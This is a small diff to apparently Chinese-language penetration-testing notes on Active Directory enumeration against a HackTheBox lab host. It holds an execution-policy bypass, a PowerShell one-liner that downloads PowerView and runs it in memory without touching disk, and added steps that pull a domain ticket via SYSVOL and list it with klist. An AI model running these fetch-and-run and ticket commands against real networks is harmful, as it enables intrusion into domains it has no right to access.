@@ -37,6 +37,11 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
   >>>> 直接下載 PowerView並載入到 記憶體中, 不落Harddisk:
     IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
 
+>>> 取Domain ticket: 
+  dir \\forest.htb.local\SYSVOL
+>>> 列出有什麼ticket: 
+  klist
+
 >>> 開始枚舉:
   最基本的東西: 
   >>>> 獲取Domain SID: 
